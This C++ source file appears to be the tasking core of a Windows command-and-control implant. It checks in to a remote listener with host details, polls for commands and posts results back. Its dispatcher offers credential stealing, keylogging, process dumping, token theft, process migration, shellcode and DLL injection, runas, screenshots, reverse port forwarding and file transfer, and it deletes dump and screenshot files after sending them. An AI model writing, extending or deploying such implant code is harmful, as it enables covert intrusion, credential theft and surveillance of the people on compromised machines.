#include "core/handler.hpp"

namespace Handler
{
    std::wstring GetInitialInfo(State::StateManager& sm)
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wListenerURL = L"";
        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(sm.GetSleep()));
        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(sm.GetJitter()));
        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(sm.GetKillDate()));

        // Get listener URL
        wListenerURL += std::wstring(sm.GetListenerProtocol());
        wListenerURL += L"://";
        wListenerURL +=	std::wstring(sm.GetListenerHost());
        wListenerURL +=	L":";
        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(sm.GetListenerPort()));

        // Get architecture
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);
        }

        std::wstring wJson = L"{";
        wJson += L"\"os\":\"" + wOS + L"\"";
        wJson += L",";
        wJson += L"\"arch\":\"" + wArch + L"\"";
        wJson += L",";
        wJson += L"\"hostname\":\"" + wHostname + L"\"";
        wJson += L",";
        wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
        wJson += L",";
        wJson += L"\"implantType\":\"" + std::wstring(sm.GetPayloadType()) + L"\"";
        wJson += L",";
        wJson += L"\"sleep\":" + wSleep + L"";
        wJson += L",";
        wJson += L"\"jitter\":" + wJitter + L"";
        wJson += L",";
        wJson += L"\"killDate\":" + wKillDate + L"";
        wJson += L"}";

        return wJson;
    }

    VOID InitHTTP(State::StateManager& sm)
    {
		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
			sm.GetListenerHost(),
			sm.GetListenerPort()
		);
        sm.SetHSession(handlers.hSession);
        sm.SetHConnect(handlers.hConnect);
    }

    VOID CloseHTTP(State::StateManager& sm)
    {
        System::Http::WinHttpCloseHandles(
            sm.GetHSession(),
            sm.GetHConnect(),
            sm.GetHRequest()
        );
    }

    // If success, get the agent UUID. This value will be used for subsequent processes.
    BOOL CheckIn(
        State::StateManager& sm,
        const std::wstring& wInfoJson
    ) {
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            sm.GetHConnect(),
            sm.GetListenerHost(),
            sm.GetListenerPort(),
            sm.GetReqPathCheckIn(),
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        // Receive the agent UUID.
        std::wstring uuid = System::Http::ReadResponseText(resp.hRequest);
        sm.SetUUID(uuid);
        
        return TRUE;
    }

    BOOL GetTask(State::StateManager& sm)
    {
        std::wstring wHeader = L"X-UUID: " + sm.GetUUID() + L"\r\n";

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            sm.GetHConnect(),
            sm.GetListenerHost(),
            sm.GetListenerPort(),
            sm.GetReqPathTaskGet(),
            L"GET",
            wHeader.c_str(),
            NULL,
            0
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        sm.SetHRequest(resp.hRequest);

        std::wstring task = System::Http::ReadResponseText(resp.hRequest);
        sm.SetTask(task);

        return TRUE;
    }

    BOOL ExecuteTask(State::StateManager& sm)
    {
        std::wstring task = sm.GetTask();

        if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
        {
            sm.SetTaskResult(Task::Cat(task.substr(4, task.size())));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
        {
            sm.SetTaskResult(Task::Cd(task.substr(3, task.size())));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"connect ") == 0)
        {
            sm.SetTaskResult(Task::Connect(sm, task.substr(8, task.size())));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::Cp(wArgs[1], wArgs[2]));
        }
        else if (wcscmp(task.c_str(), L"creds steal") == 0)
        {
            sm.SetTaskResult(Task::CredsSteal());
        }
        else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }
            std::wstring wDllSrc;
            for (size_t i = 2; i < wArgs.size(); i++)
            {
                wDllSrc += wArgs[i];
            }

            sm.SetTaskResult(Task::Dll(sm, wArgs[1], wDllSrc));
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::Download(sm, wArgs[1], wArgs[2]));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
        {
            sm.SetTaskResult(Task::Execute(task.substr(8, task.size())));
        }
        else if (wcscmp(task.c_str(), L"groups") == 0)
        {
            sm.SetTaskResult(Task::Groups());
        }
        else if (wcscmp(task.c_str(), L"history") == 0)
        {
            sm.SetTaskResult(Task::History());
        }
        else if (wcscmp(task.c_str(), L"ip") == 0)
        {
            sm.SetTaskResult(Task::Ip());
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
        {
            sm.SetTaskResult(Task::KeyLog(task.substr(7, task.size())));
        }
        else if (wcscmp(task.c_str(), L"kill") == 0)
        {
            sm.SetTaskResult(Task::Kill());
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
        {
            sm.SetTaskResult(Task::Ls(task.substr(3, task.size())));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
        {
            sm.SetTaskResult(Task::Migrate(task.substr(8, task.size())));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
        {
            sm.SetTaskResult(Task::Mkdir(task.substr(6, task.size())));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::Mv(wArgs[1], wArgs[2]));
        }
        else if (wcscmp(task.c_str(), L"net") == 0)
        {
            sm.SetTaskResult(Task::Net());
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
        {
            sm.SetTaskResult(Task::Procdump(task.substr(9, task.size())));
        }
        else if (wcscmp(task.c_str(), L"ps") == 0)
        {
            sm.SetTaskResult(Task::Ps());
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
        {
            sm.SetTaskResult(Task::PsKill(task.substr(8, task.size())));
        }
        else if (wcscmp(task.c_str(), L"pwd") == 0)
        {
            sm.SetTaskResult(Task::Pwd());
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 5)
            {
                return FALSE;
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }

            sm.SetTaskResult(Task::RegSubKeys(wRootKey, wSubKey, bRecurse));
        }
        else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 5)
            {
                return FALSE;
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }

            sm.SetTaskResult(Task::RegValues(wRootKey, wSubKey, bRecurse));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
        {
            sm.SetTaskResult(Task::Rm(task.substr(3, task.size())));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
        {
            sm.SetTaskResult(Task::Rmdir(task.substr(6, task.size())));
        }
        else if (wcscmp(task.substr(0, 13).c_str(), L"rportfwd add ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 5)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::RportfwdAdd(sm, wArgs[2], wArgs[3], wArgs[4]));
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"rportfwd rm ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 4)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::RportfwdRm(wArgs[2], wArgs[3]));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 3)
            {
                return FALSE;
            }
            std::wstring wUser = wArgs[1];
            std::wstring wPassword = wArgs[2];
            std::wstring wCmd;
            for (size_t i = 3; i < wArgs.size(); i++)
            {
                wCmd += wArgs[i];
            }

            sm.SetTaskResult(Task::RunAs(wUser, wPassword, wCmd));
        }
        else if (wcscmp(task.c_str(), L"screenshot") == 0)
        {
            // Is DLL implant, the screenshot feature is not available.
            #ifndef IS_DLL
            sm.SetTaskResult(Task::Screenshot(sm));
            #else
            sm.SetTaskResult(L"Cannot take a screenshot on DLL.");
            #endif
        }
        else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
        {
            // Parse arguments
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }
            std::wstring wPid = wArgs[1];
            std::wstring wSrc;
            for (size_t i = 2; i < wArgs.size(); i++)
            {
                wSrc += wArgs[i];
            }

            sm.SetTaskResult(Task::Shellcode(sm, wArgs[1], wSrc));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
        {
            sm.SetTaskResult(Task::Sleep(sm, task.substr(6, task.size())));
        }
        else if (wcscmp(task.c_str(), L"token revert") == 0)
        {
            sm.SetTaskResult(Task::TokenRevert());
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 4)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::TokenSteal(wArgs[2], wArgs[3]));
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            sm.SetTaskResult(Task::Upload(sm, wArgs[1], wArgs[2]));
        }
        else if (wcscmp(task.c_str(), L"users") == 0)
        {
            sm.SetTaskResult(Task::Users());
        }
        else if (wcscmp(task.c_str(), L"whoami") == 0)
        {
            sm.SetTaskResult(Task::Whoami());
        }
        else if (wcscmp(task.c_str(), L"whoami priv") == 0)
        {
            sm.SetTaskResult(Task::WhoamiPriv());
        }
        else
        {
            sm.SetTaskResult(L"Error: Invalid task.");
        }

        return TRUE;
    }

    BOOL SendTaskResult(State::StateManager& sm)
    {
        System::Http::WinHttpResponse resp;

        // Prepare additional headers
        std::wstring wHeaders;
        wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n" + L"X-Task: " + sm.GetTask() + L"\r\n";

        // When the "procdump" and "screenshot" tasks,
        // read bytes of the captured image file and send them.
        if (
            (wcscmp(sm.GetTask().substr(0, 9).c_str(), L"procdump ") == 0) ||
            (wcscmp(sm.GetTask().c_str(), L"screenshot") == 0)
        ) {
            // Load a captured image file
            std::vector<char> fileData = System::Fs::ReadBytesFromFile(sm.GetTaskResult());

            // Delete the temp procdump/image file
            DeleteFile(sm.GetTaskResult().c_str());

            resp = System::Http::SendRequest(
                sm.GetHConnect(),
                sm.GetListenerHost(),
                sm.GetListenerPort(),
                sm.GetReqPathTaskResult(),
                L"POST",
                wHeaders.c_str(),
                (LPVOID)fileData.data(),
                (DWORD)fileData.size()
            );
        }
        else
        {
            // I couln't retrieve the `wstring` length correctly, so use `string` here.
            std::string sTaskResult = Utils::Convert::UTF8Encode(sm.GetTaskResult());

            resp = System::Http::SendRequest(
                sm.GetHConnect(),
                sm.GetListenerHost(),
                sm.GetListenerPort(),
                sm.GetReqPathTaskResult(),
                L"POST",
                wHeaders.c_str(),
                (LPVOID)sTaskResult.c_str(),
                (DWORD)strlen(sTaskResult.c_str())
            );
        }

        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        return TRUE;
    }
}


